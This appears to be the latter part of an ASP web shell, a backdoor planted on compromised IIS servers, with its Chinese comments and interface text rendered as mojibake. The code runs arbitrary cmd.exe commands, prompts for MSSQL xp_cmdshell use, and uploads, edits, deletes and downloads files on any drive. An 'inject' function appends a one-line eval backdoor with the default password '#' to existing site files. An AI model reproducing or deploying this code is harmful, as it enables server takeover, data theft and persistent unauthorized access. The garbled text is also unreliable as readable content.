       tmp=Mid(nums,i,1)    'È¡³önumsµÄµÚ1¸ö×Ö·û´æ·Åµ½ÁÙÊ±±äÁ¿tmpÖÐ
       If IsNumeric(tmp) Then    'Èç¹ûtmpÖÐµÄÄÚÈÝÊÇÊýÖµÐÍ£¬ÔòÖ´ÐÐÏÂÃæ´úÂë
           tmp=tmp * 16 * (16^(nums_len-i-1))    '´ËÎª16½øÖÆÊýÖµÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
       Else
           'ÏÞÖÆÊäÈëµÄ16½øÖÆÊýµÄ·¶Î§ÔÚ0--9¼°a--fÖ®¼ä
           If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then
               alert("ÄãÊäÈëµÄÊýÖµÖÐÓÐ·Ç·¨×Ö·û£¬16½øÖÆÊýÖ»°üÀ¨1¡«9¼°a¡«fÖ®¼äµÄ×Ö·û£¬ÇëÖØÐÂÊäÈë¡£")
               exit sub
           End If
           tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))    '´ËÎª16½øÖÆ×Ö·û´®ÐÍÊý¾Ý×ª»¯Îª10½øÖÆÊýÖµµÄ¹«Ê½
       End If
           '½«ÉÏÃæ×ª»¯ºóµÄÊýÖµÓëtmpstrÏà¼ÓÀÛ¼Æ³ö×ÜºÍ
           tmpstr=tmpstr+tmp
   Next
   alert("×ª»»µÄ10½øÖÆÎª:"&tmpstr&"Æä×Ö·ûÖµÎª:"&chr(tmpstr))
   End If
   end sub
   </script>
   <input type=text name=text1 value=×Ö·ûºÍÊý×Ö×ª10ºÍ16½øÖÆ size=30 id=text9><input type=submit onclick=main() value="¸øÎÒ×ª">
   <input type="text" name="vars" value=16½øÖÆ×ª10½øÖÆºÍ×Ö·û size=30 id=vars><input type=submit onclick=main2() value="¸øÎÒ×ª"></table>
   </center>
   <br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
   <form  action=""  method="post">
   <Input TYPE="TEXT" NAME="SQL" value="<%=strSQL%>" size ="30">
     <Input TYPE="TEXT" NAME="strcon" value="Provider=SQLOLEDB.1;Persist Security Info=False;Server=SQL·þÎñÆ÷ip;UserID=ÓÃ»§Ãû;Password=ÃÜÂë;" size=30 >
   <input TYPE="SUBMIT" value="sqlÀ©Õ¹">&nbsp
   <input type="button"   value="ÌáÊ¾" onClick="prompt('¿ÉÒÔÖ´ÐÐmssqlÀ©Õ¹,¾ÙÀý:exec master.dbo.xp_cmdshell ÃüÁîÓï¾ä','¸ü¸Ä±íµ¥×Ö·û´®ÖÐµÄÏàÓ¦ÖµºóÔÙ½øÐÐ²Ù×÷')" >
   </form></tr></table><br><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
   <tr bgcolor="#EEEEEE" height=18 class="noborder"><td>
   <form name="form11" method="post" action=<%=filename%>?up=yes enctype="multipart/form-data">
   ÒÑÓÐÎïÀíÄ¿Â¼+ÎÄ¼þÃû:
         <input name="filepath" value="d:\test.asp" size="16">
             ÎÄ¼þµØÖ·:
   <input name="file1" type="file"  size="13">
   <input type="submit" name="Submit" value=" ÉÏ´«">
    </form></td></Tr></table>
   </center>
   <%'-----------------Ãâfso´úÂëshell.application¿ªÊ¼------------------
   DSnXA = Request.Form("text")   'Ä¿Â¼ä¯ÀÀ
   if (DSnXA <> "")  then
   set shell=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell.namespace(DSnXA)
   set foditems=fod1.items
   for each co in foditems
   response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
   next
   end if
   %>
   <%
   DSnXA1 = Request.Form("text1")  'Ä¿Â¼¿½±´£¬²»ÄÜ½øÐÐÎÄ¼þ¿½±´
   DSnXA2 = Request.Form("text2")
   if DSnXA1<>"" and DSnXA2<>"" then
   set shell1=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell1.namespace(DSnXA2)
   for i=len(DSnXA1) to 1 step -1
   if mid(DSnXA1,i,1)="\" then
      path=left(DSnXA1,i-1)
      exit for
   end if
   next
   if len(path)=2 then path=path & "\"
   path2=right(DSnXA1,len(DSnXA1)-i)
   set fod2=shell1.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.copyhere foditem
   response.write "command completed success!"
   end if
   %>
   <%
   DSnXA3 = Request.Form("text3")   'Ä¿Â¼ÒÆ¶¯
   DSnXA4 = Request.Form("text4")
   if DSnXA3<>"" and DSnXA4<>"" then
   set shell2=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   set fod1=shell2.namespace(DSnXA4)
   for i=len(DSnXA3) to 1 step -1
   if mid(DSnXA3,i,1)="\" then
      path=left(DSnXA3,i-1)
      exit for
   end if
   next
   if len(path)=2 then path=path & "\"
   path2=right(DSnXA3,len(DSnXA3)-i)
   set fod2=shell2.namespace(path)
   set foditem=fod2.parsename(path2)
   fod1.movehere foditem
   response.write "command completed success!"
   end if
   %>
   <%
   DSnXA5 = Request.Form("text5")    'Ö´ÐÐ³ÌÐòÒªÖ¸¶¨Â·¾¶
   DSnXA6 = Request.Form("text6")
   if DSnXA5<>"" and DSnXA6<>"" then
   set shell3=server.createobject("shell.application") '½¨Á¢shell¶ÔÏó
   shell3.namespace(DSnXA5).items.item(DSnXA6).invokeverb
   response.write "command completed success!"
   end if
   %>
   <br><br>
   <center><table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8" class="noborder">
   <tr bgcolor="#EEEEEE" height=18 class="noborder">
         <td colspan=2 align=center><form method="POST" action=""&url&"">
   Enter Password£º<input type="password" name="password" size="20">
   <input type="submit" value="LOGIN"></td>
      </tr>
   </form></td></tr></table>
   </center>
   </body>
   <%end sub%>
   <% end if %>
   <%sub main()'---------------------Ãâfso´úÂë½áÊø£¬fso´úÂë¿ªÊ¼---------------------
   urlpath=Request.ServerVariables("SERVER_NAME")
   dim cpath,lpath
   if Request("path")="" then
   lpath="/"
   else
   lpath=Request("path")&"/"
   end if
   if Request("attrib")="true" then
   cpath=lpath
   attrib="true"
   else
   cpath=Server.MapPath(lpath)
   attrib=""
   end if
   %><html>
   <script language="JavaScript">
   function crfile(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
   return false;
   }
   function crdir(ls)
   {if (ls==""){alert("ÇëÊäÈëÎÄ¼þÃû!");}
   else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
   return false;
   }
   </script>
   <script language="vbscript">
   sub rmdir(ls)
   if confirm("ÄãÕæµÄÒªÉ¾³ýÕâ¸öÄ¿Â¼Âð!"&Chr(13)&Chr(10)&"Ä¿Â¼Îª£º"&ls)   then
   window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
   end if
   end sub
   sub copyfile(sfile)
   dfile=InputBox(""&Chr(13)&Chr(10)&"Ô´ÎÄ¼þ£º"&sfile&Chr(13)&Chr(10)&"ÇëÊäÈëÄ¿±êÎÄ¼þµÄÎÄ¼þÃû:"&Chr(13)&Chr(10)&"Ðí´øÂ·¾¶,Òª¸ù¾ÝÄãµÄµ±Ç°Â·¾¶Ä£Ê½. ×¢Òâ:¾ø¶ÔÂ·¾¶Ê¾Àýc:/»òc:\¶¼¿ÉÒÔ")
   dfile=trim(dfile)
   attrib="<%=request("attrib")%>"
   if dfile<>"" then
   if InStr(dfile,":") or InStr(dfile,"/")=1 then
   lp=""
   if InStr(dfile,":") and attrib<>"true" then
   alert "¶Ô²»Æð£¬ÄãÔÚÏà¶ÔÂ·¾¶Ä£Ê½ÏÂ²»ÄÜÊ¹ÓÃ¾ø¶ÔÂ·¾¶"&Chr(13)&Chr(10)&"´íÎóÂ·¾¶£º["&dfile&"]"
   exit sub
   end if
   else
   lp="<%=lpath%>"
   end if
   window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
   else
   alert"ÄúÃ»ÓÐÊäÈëÎÄ¼þÃû£¡"
   end If
   end sub
   </script><body bgcolor="#F5F5F5">
   <TABLE cellSpacing=1 cellPadding=3 width="750" align=center
   bgColor=#b8b8b8 border=0 class="noborder">
   <TBODY>
   <TR >
   <TD
   height=22 colspan="4" bgcolor="#EEEEEE" >ÇÐ»»ÅÌ·û£º
   <%
   For Each thing in objfsolhn.Drives
   Response.write "<a href='"&url&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"ÅÌ:</a>          "
   NEXT
   %>   &nbsp;±¾»ú¾ÖÓòÍøµØÖ·£º
   <%= "\\" & oScriptNetlhn.ComputerName & "\" & oScriptNetlhn.UserName %></td>
   </TR>  <TD colspan="4" bgcolor="#EEEEEE" ><%
   if Request("attrib")="true"  then
   response.write "<a href='"&url&"'><font color='#D00000'>µã»÷ÇÐ»»µ½Ïà¶ÔÂ·¾¶±à¼Ä£Ê½</font></a>"
   else
   response.write "<a href='"&url&"?attrib=true'><font color='#D00000'>µã»÷ÇÐ»»µ½¾ø¶ÔÂ·¾¶±à¼Ä£Ê½</font></a>"
   end if
   %>&nbspÂ·¾¶: <%=cpath%>  &nbsp;&nbsp;µ±Ç°ä¯ÀÀÄ¿Â¼:<%=lpath%>
   </TD></TR> <TR>
   <TD height=22 colspan="4" bgcolor="#EEEEEE" >
   <form name="form1" method="post" action="<%=url%>" >
   ä¯ÀÀÄ¿Â¼: <input type="text" name="path" size="30" value="c:">
   <input type="hidden" name="attrib" value="true">
   <input type="submit" name="Submit" value="ä¯ÀÀÄ¿Â¼" > ¡¼ÇëÓÃ¾ø¶ÔÂ·¾¶¡½
   &nbsp&nbsp&nbsp<input type="submit" name="Submit1" value="·µ»ØÃâfsoÒ³Ãæ">
   </TD></form>
   <%
   if request.form("submit1")="·µ»ØÃâfsoÒ³Ãæ" then
   call out()
   end if%>
   </TR>
   <TR bgcolor="#EEEEEE">
   <TD colspan="4" >
   <%
   DSnXA = Request.Form(".CMD")
   If (DSnXA <> "") Then
   szTempFile = "c:\" & objfsolhn.GetTempName( )
   Call oScriptlhn.Run ("cmd.exe /c " & DSnXA & " > " & szTempFile, 0, True)
   Set oFilelcx = objfsolhn.OpenTextFile (szTempFile, 1, False, 0)
   End If%>
   <FORM action="<%= Request.ServerVariables("URL") %>" method="POST" name=userdata>
   <input type=text name=".CMD" size=83 value="<%= DSnXA %>">
   <input type=submit value="cmdÃüÁî"></td></form></Tr>
   <TR bgcolor="#EEEEEE">
   <TD colspan="4" >
   <form name="form11" method="post" action=<%=filename%>?up=yes enctype="multipart/form-data">
   ÒÑÓÐÎïÀíÄ¿Â¼+ÎÄ¼þÃû:
         <input name="filepath" value="d:\test.asp" size="22">
   ÎÄ¼þµØÖ·:
   <input name="file1" type="file"  size="20">
   <input type="submit" name="Submit" value=" ÉÏ´«"> </td>
    </form></tr>
   <TR bgcolor="#EEEEEE">
   <TD colspan="4" >
   <form action="<%= Request.ServerVariables("URL") %>" method="post">
   ¹Ø¼ü×ÖËÑË÷£º <input type="text" size="30" name="SearchString" value="<%=SearchString%>"> <input type="text" size="15" name="path88" value=ÎïÀíÂ·¾¶µÄÄ¿Â¼><input
   type="submit" value="¿ÉÓÃÓÚ¼ìË÷´æÔÚµÄaspÄ¾Âí"></td>
   </form></tr>
   <TR bgColor=#EEEEEE>
   <TD height=22 colspan="4" ><form name="newfile"
   onSubmit="return crfile(newfile.filename.value);">
   <input type="text" name="filename" size="40">
   <input type="submit" value="ÐÂ½¨ÎÄ¼þ" >
   <input type="button" value="ÐÂ½¨Ä¿Â¼"onclick="crdir(newfile.filename.value)">¡¼ÐÂ½¨ÎÄ¼þºÍÐÂ½¨Ä¿Â¼²»ÄÜÍ¬Ãû¡½
   </TD></form>
   <pre>
   <% If (IsObject(oFilelcx)) Then
   Response.Write Server.HTMLEncode(oFilelcx.ReadAll)
   oFilelcx.Close
   Call objfsolhn.DeleteFile(szTempFile, True)
   End If %>
   <%
   Set fd = objfsolhn.GetFolder(Request("path88")&"\")
   If SearchString <> "" Then
   Response.Write "<H2>ÈçÏÂ½Å±¾ÎÄ¼þÄÚÇ¶ÈëËÑË÷µÄ<font color=red>" & SearchString & "</font>¹Ø¼ü×Ö£º</H2><P>"
   SearchFolder fd,SearchString
   End If
   %>
   </TR>
   <TR>
   <TD height=22 width="26%" rowspan="2" valign="top" bgColor=#EEEEEE >
   <%
   dim theFolder,theSubFolders
   if objfsolhn.FolderExists(cpath)then
   Set theFolder=objfsolhn.GetFolder(cpath)
   Set theSubFolders=theFolder.SubFolders
   Response.write"<a href='"&url&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>¡ö</font>¡ü<font color='ff2222'>»ØÉÏ¼¶Ä¿Â¼</font></a><br>"
   For Each x In theSubFolders%>
   <%Response.write"<a href='"&url&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>©¸<font color='#FF8000'>¡ö</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >¡Á</font>É¾³ý</a><br>"
   Next
   end if
   %>
   </TD>
   <TD  width="45%"  bgColor=#EEEEEE>ÎÄ¼þÃû £¨Êó±êÒÆµ½ÎÄ¼þÃû¿ÉÒÔ²é¿´¸øÎÄ¼þµÄÊôÐÔ£©</TD>
   <TD width="11%" bgColor=#EEEEEE>´óÐ¡£¨×Ö½Ú£©</TD>
   <TD width="18%" bgColor=#EEEEEE>ÎÄ¼þ²Ù×÷</TD>
   </TR>
   <TR>
   <TD height=200 colspan="3" valign="top" bgColor=#EEEEEE>
   <%
   dim theFiles
   if objfsolhn.FolderExists(cpath)then
   Set theFolder=objfsolhn.GetFolder(cpath)
   Set theFiles=theFolder.Files
   Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
   For Each x In theFiles
   if Request("attrib")="true" then
   showstring="<strong>"&x.Name&"</strong>"
   else
   showstring="<a href='"&lpath&x.Name&"' title='"&"ÀàÐÍ"&x.type&chr(10)&"ÊôÐÔ"&x.Attributes&chr(10)&"Ê±¼ä£º"&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
   end if
   Response.write"<tr><td width='50%'  style='border-bottom:1 solid #000000;'><font color='#FF8000'>¡õ</font>"&showstring&"</td><td width='8%'  style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%'  style='border-bottom:1 solid #000000;'><a href='"&url&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;edit</a><a href="&chr(34)&"javascript: copyfile('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' ></font>&nbsp;copy</a><a href='"&url&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank' >&nbsp;del</a><a href='"&url&"?id=down&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;down</a><a href='"&url&"?id=inject&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >&nbsp;inject</a></td></tr>"
   Next
   end if
   Response.write"</table>"
   %>
   </TD>
   </TR></TBODY>
   </TABLE>
   <% end sub
   sub edit()
   if request("op")="del"  then
   '**********É¾³ýÎÄ¼þ********
   if Request("attrib")="true" then
   whichfile=Request("path")
   else
   whichfile=server.mappath(Request("path"))
   end if
   Set thisfile = objfsolhn.GetFile(whichfile)
   thisfile.Delete True
   Response.write "<br><center>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û.</center>"
   '**********É¾³ýÎÄ¼þ½áÊø********
   else
   if request("op")="copy" then
   '**********¸´ÖÆÎÄ¼þ********
   if Request("attrib")="true" then
   whichfile=Request("path")
   dsfile=Request("dpath")
   else
   whichfile=server.mappath(Request("path"))
   dsfile=Server.MapPath(Request("dpath"))
   end if
   Set thisfile = objfsolhn.GetFile(whichfile)
   thisfile.copy dsfile
   Response.write "<center><p>Ô´ÎÄ¼þ£º"+whichfile+"</center>"
   Response.write "<center><br>Ä¿µÄÎÄ¼þ£º"+dsfile+"</center>"
   Response.write "<center><br>¸´ÖÆ³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</p></center>"
   '**********¸´ÖÆÎÄ¼þ½áÊø********
   else
   if request.form("text")="" then
   if Request("creat")<>"yes" then
   if Request("attrib")="true" then
   whichfile=Request("path")
   else
   whichfile=server.mappath(Request("path"))
   end if
   Set thisfile = objfsolhn.OpenTextFile(whichfile, 1, False)
   counter=0
   thisline=Server.HTMLEncode(thisfile.readall)
   thisfile.Close
   end if
   %>
   <form method="POST" action=""&url&"?id=edit">
   <input type="hidden" name="attrib" value="<%=Request("attrib")%>">
   <br>
   <TABLE cellSpacing=1 cellPadding=3 width="750" align=center
   bgColor=#b8b8b8 border=0 class="noborder">
   <TBODY>
   <TR >
   <TD
   height=22 bgcolor="#EEEEEE" ><div align="center">º£Ñô¶¥¶ËÍøASPÄ¾Âí£À2005¦Á°æÎÄ¼þ±à¼Æ÷</div></TD>
   </TR>
   <TR >
   <TD width="100%"
   height=22 bgcolor="#EEEEEE" >ÎÄ¼þÃû£º
   <input type="text" name="path" size="45"
   value="<%=Request("path")%>"readonly>
   </TD></TR><TR>
   <TD
   height=22 bgcolor="#EEEEEE" > <div align="center">
   <textarea rows="25" name="text" cols="105"><%=thisline%></textarea>
   </div></TD></TR><TR>
   <TD
   height=22 bgcolor="#EEEEEE" ><div align="center">
   <input type="submit"
   value="Ìá½»" name="B1">
   <input type="reset" value="¸´Ô" name="B2">
   </div></TD>
   </TR>
   </TABLE>
   </form>
   <%else
   if Request("attrib")="true" then
   whichfile=Request("path")
   else
   whichfile=server.mappath(Request("path"))
   end if
   Set outfile=objfsolhn.CreateTextFile(whichfile)
   outfile.WriteLine Request("text")
   outfile.close
   Response.write "<center>ÐÞ¸Ä³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û!</center>"
   end if
   end if
   end if
   end sub
   %>
   <% sub dir()
   if request("op")="del"  then
   '***********É¾³ýÄ¿Â¼**********
   if Request("attrib")="true" then
   whichdir=Request("path")
   else
   whichdir=server.mappath(Request("path"))
   end if
   objfsolhn.DeleteFolder whichdir,True
   Response.write "<center>É¾³ý³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û£¬É¾³ýµÄÄ¿Â¼Îª:<b>"&whichdir&"</b></center>"
   '**********É¾³ýÄ¿Â¼½áÊø*************
   else
   '***********ÐÂ½¨Ä¿Â¼**********
   if request("op")="creat"  then
   if Request("attrib")="true" then
   whichdir=Request("path")
   else
   whichdir=server.mappath(Request("path"))
   end if
   objfsolhn.CreateFolder whichdir
   Response.write "<center>½¨Á¢³É¹¦£¡ÒªË¢ÐÂ²ÅÄÜ¿´µ½Ð§¹û,½¨Á¢µÄÄ¿Â¼Îª:<b>"&whichdir&"</b></center>"
   '***********ÐÂ½¨Ä¿Â¼½áÊø**********
   end if
   end if
   end sub
   '****ÏÂÔØÎÄ¼þ
   function downloadFile(strFile)
   if  request("attrib")="" then
   strFilename = server.MapPath(strFile)
   end if
   if  request("attrib")="true" then
   strFilename = Request("path")
   end if
   Response.Buffer = True
   Response.Clear
   Set s = Server.CreateObject("ADODB.Stream")
   s.Open
   s.Type = 1
   on error resume next
    if not objfsolhn.FileExists(strFilename) then
     Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
     Response.End
    end if
    Set f = objfsolhn.GetFile(strFilename)
    intFilelength = f.size
   s.LoadFromFile(strFilename)
    if err then
     Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
     Response.End
    end if
    Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
    Response.AddHeader "Content-Length", intFilelength
    Response.CharSet = "UTF-8"
    Response.ContentType = "application/octet-stream"
     Response.BinaryWrite s.Read
    Response.Flush
    s.Close
    Set s = Nothing
    response.end
   End Function
   %>
   <%'²åÈëÎÄ¼þ
   sub inject()
   if Request("id")="inject"  and request("attrib")<>"true"then
   testfile=Server.MapPath(""&Request("path")&"")
   set thisfile=objfsolhn.OpenTextFile(testfile,8,True,0)
   thisfile.WriteLine("<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>try{eval(Request.form('#')+'')}catch(e){}</SCRIPT>")
   thisfile.close
   Response.write "succeed!ÇëÓÃ±ùºüÀË×ÓaspºóÃÅÀ´À´·ÃÎÊÄã²åÈëµÄÎÄ¼þ"&Request("path")&"Ä¬ÈÏÃÜÂëÊÇ#"
   else
   Response.write "<form method='POST' action='"&Request.ServerVariables("URL")&"?id=inject'>"
   Response.write "<input type='text' name='path' readonly value='"&Request("path")&"'>"
   Response.write "<input name='submit' type='submit' value='ÕâÀïÄã²åÈëÊ²Ã´Ñ½£¬ËüÊÇÎïÀíÄ¿Â¼ÎÄ¼þÁË' ></form>"
   end if
   end sub
   %>
   <%function fieldtype(typeid)
   select case typeid
       case 130    fieldtype = "ÎÄ±¾"
       case 2      fieldtype = "ÕûÐÍ"
       case 3      fieldtype = "³¤ÕûÐÍ"
       case 7      fieldtype = "ÈÕÆÚ/Ê±¼ä"
       case 5      fieldtype = "Ë«¾«¶ÈÐÍ"
       case 11     fieldtype = "ÊÇ/·ñ"
       case 128    fieldtype = "OLE ¶ÔÏó"
       case else   fieldtype = typeid
   end select
   end function
   function fillbefore(str,prefix,totallen)
   str=CStr(str)
   if len(str)<totallen then
       for i=1 to totallen-len(str)
           str = prefix & str
       next
   end if
   fillbefore = str
   end function
    %>
   <br>
   <CENTER>ÔðÈÎ×Ô¸º£¡<br></center>
   <center>¸ÐÐ»Å¬Á¦</center>
   </body>
   </html>
